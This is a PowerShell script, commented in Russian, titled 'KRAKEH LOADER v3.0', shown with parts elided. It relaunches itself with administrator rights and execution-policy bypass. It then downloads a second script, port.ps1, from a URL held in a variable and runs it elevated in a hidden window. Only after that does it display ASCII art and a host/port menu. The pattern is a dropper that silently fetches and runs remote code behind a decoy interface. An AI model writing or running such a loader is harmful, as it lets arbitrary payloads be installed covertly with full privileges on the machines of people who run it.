# ===== KRAKEH HOST/PORT LOADER v3.0 =====
# ПЕРВЫМ ДЕЛОМ КАЧАЕМ PS1, ПОТОМ МЕНЮ С ХОСТАМИ/ПОРТАМИ

$Host.UI.RawUI.WindowTitle = "KRAKEH LOADER v3.0"
...
# ===== 1. ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА И ПЕРЕЗАПУСК =====
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# ===== 2. СКАЧИВАЕМ И ЗАПУСКАЕМ СКРИПТ ПЕРЕД МЕНЮ =====
Write-Host "[*] СКАЧИВАЮ port.ps1..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $ScriptURL -OutFile $ScriptPath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] СКАЧАНО! ЗАПУСКАЮ ОТ АДМИНА..." -ForegroundColor Green
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`"" -Verb RunAs -WindowStyle Hidden
    Write-Host "[+] СКРИПТ ЗАПУЩЕН В ФОНЕ!" -ForegroundColor Magenta
} catch {
    Write-Host "[-] ОШИБКА СКАЧИВАНИЯ! МЕНЮ ВСЁ РАВНО ОТКРОЕТСЯ." -ForegroundColor Red
}

Start-Sleep 2
Clear-Host

# ===== НОВЫЙ АРТ (БЕЗ МАЙНКРАФТА) =====
$Art = @"
    ██╗  ██╗██████╗  █████╗ 
    ██║ ██╔╝██╔══██╗██╔══██╗
    █████╔╝ ██████╔╝███████║
...
function Show-MainMenu {
    ...
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "       KRAKEH LOADER v3.0" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
